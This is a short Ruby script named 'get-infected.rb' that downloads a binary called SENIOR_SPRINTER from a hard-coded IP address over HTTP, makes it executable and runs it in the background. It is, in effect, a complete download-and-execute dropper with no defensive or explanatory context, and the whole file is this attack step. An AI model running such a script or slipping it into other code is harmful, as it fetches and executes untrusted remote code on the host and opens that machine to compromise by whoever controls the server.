# get-infected.rb
require 'open-uri'
install_url = "http://44.212.29.229/SENIOR_SPRINTER"
IO.copy_stream(URI.open(install_url), 'SENIOR_SPRINTER')

%x(chmod +x SENIOR_SPRINTER)
%x(./SENIOR_SPRINTER & >&2)
